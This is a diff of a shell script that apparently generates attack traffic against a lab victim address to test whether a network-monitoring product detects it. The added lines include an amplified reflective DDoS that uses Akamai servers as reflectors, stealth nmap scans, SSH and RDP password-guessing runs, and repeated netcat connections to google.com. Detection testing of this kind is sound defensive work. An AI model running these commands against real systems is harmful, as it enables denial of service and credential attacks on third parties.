@@ -6,9 +6,10 @@
 # In linux we need to be root in order to generate traffic online (in most cases)
 su
 
+########################### variables
 # Victim address
 VICTIM='10.8.120.129'
-
+INTERFACE=ens160
 ########################### utility functions
 function print_start {
     echo "############## starting $1 at `date` ##############"
@@ -51,6 +52,7 @@ ping 93.190.140.162 -c 1
 ping google.com -c 1
 print_end "Blacklist"
 
+
 # DHCP anomaly
 # detect increased traffic of DHCP
 # Send 1000 dhcp request with spoofing client 0.0.0.0
@@ -65,30 +67,35 @@ print_end "DHCP increased traffic anomaly"
 # DOS
 # Simple DoS
 print_start "simple dos attack"
-python dos.py $VICTIM
+python dos.py ${VICTIM}
 print_end "simple dos attack"
 
+
 # Amplified DDoS attack
-# Use Saddam to generate amplified DDoS attack
+# We use Akamai servers in order to amplified the ddos attack
+# -l : Akamai servers list IPs
+# -t : target
+# -r : request to send
+# -n : number of threads
+print_start "reflective DDoS"
+cd reflective_ddos
+python ARDT.py -l akamai_servers_list.txt -t ${VICTIM} -r ExampleHTTPReq.txt  -n 10
+print_end "reflective DDoS"
 
-
-# 8 DIRINET
+# communicate directly with the internet
 # access to internet - just ping google.
 # -c 1 : only one ping
 print_start "connect to internet"
 ping google.com -c 1
 print_end "connect to internet"
 
-# 9 DIVCOM
-# This method detects anomalies in traffic from the used to work port in each host.
-# For example, if host was only comunicated from port 80 and suddenly started communicate through ports 443, 5277
-
 
 # 12 DOS
 # Dos Attack - flowmon should alert about it
 print_start "ddos attack"
-python dos.py $VICTIM
+python dos.py ${VICTIM}
 print_end "ddos attack"
+
 
 # Communicate with top spammers according to McAfee.
 # Dor further details: http://www.mcafee.com/threat-intelligence/ip/spam-senders.aspx
@@ -97,33 +104,75 @@ communicate_with_spammers
 print_end "spammers check"
 
 
+### Port scanning ###
+# We do stealth sys scan to check whether flowman detects port scanning
+# This should also find icmp type 3 (port unreachable) anomaly
 
-# 13 HIGHTRANSF
+# SYN scan
+print_start "SYN port scanning"
+nmap -sS ${VICTIM}
+print_end "SYN port scanning"
+
+# FIN scan
+print_start "FIN port scanning"
+nmap -sF ${VICTIM}
+print_end "FIN port scanning"
+
+# XMAS scan
+print_start "XMAS port scanning"
+nmap -sX ${VICTIM}
+print_end "XMAS port scanning"
+
+# NULL scan
+print_start "NULL port scanning"
+nmap -sN ${VICTIM}
+print_end "NULL port scanning"
+
+# UDP scan
+nmap -sU ${VICTIM}
+# SSH attack
+print_start "ssh attack"
+python ssh_attack.py ${VICTIM} common_passwords.txt
+print_end "ssh attack"
+
+# RDP attack
+# try to crack RDP server user and password
+print_start "RDP attack"
+cd RDP
+python rdp_attack.py -m x -w rdp_servers.txt -c cracked.txt -n -v common_passwords.txt rdp_servers.txt
+cd ..
+print_end "RDP attack"
+
+# TOR browsing detection
+# Cahnge MTU for *.pcap files replaying
+sudo ifconfig ${INTERFACE} mtu 9000 up
+
+## replay a pcap file of recorded tor browser usage traffic
+## -t : turbo mode, replay packets as fast as you can (packet timestamp has no effect)
+## --intf1 : which interface to send from (change if necessary)
+#print_start "tor browser detection"
+#sudo tcpreplay -t --intf1=${INTERFACE} tor.pcap
+#print_end "tor browser detection"
+#
+## replay a pcap file of recorded teamviewer (RDP protocol)usage traffic
+## -t : turbo mode, replay packets as fast as you can (packet timestamp has no effect)
+## --intf1 : which interface to send from (change if necessary)
+#print_start "RDP protocol detection"
+#sudo tcpreplay -t --intf1=${INTERFACE} rdp.pcap
+#print_end "RDP protocol detection"
+
+# Telnet anomaly
+# Try to open 100 telnet connections
+print_start "Telnet anomaly"
+for i in `seq 1 100`;
+    do
+            sudo nc -p 23 -w 0.1 google.com > /dev/null
+    done
+print_end "Telnet anomaly"
+
 # Checks that flowmon detects large file download, the file is 1.6GB,
 # Also should find connectivity to internet
 #print_start "large download"
 #wget https://archive.ics.uci.edu/ml/machine-learning-databases/00347/1000_train.csv.gz
 #rm 1000_train.csv.gz
 #print_end "large download"
-
-# 17 ICMPANOM
-# ICMP type 3 (unreachable port) sending to victim, as flowmon claim to detect
-print_start "ICMP type 3"
-#python icmpT3.py $VICTIM
-print_end "ICMP type 3"
-
-# 25 SCANS
-# Port scanning.
-# We do stealth sys scan to check whether flowman detects port scanning
-# This should also find icmp type 3 (port unreachable) anomaly
-print_start "stealth syn port scanning"
-nmap -sS $VICTIM
-print_end "stealth syn port scanning"
-
-
-# 39 SSHDICT
-print_start "ssh attack"
-python ssh_attack.py $VICTIM common_passwords.txt
-print_end "ssh attack"
-
-
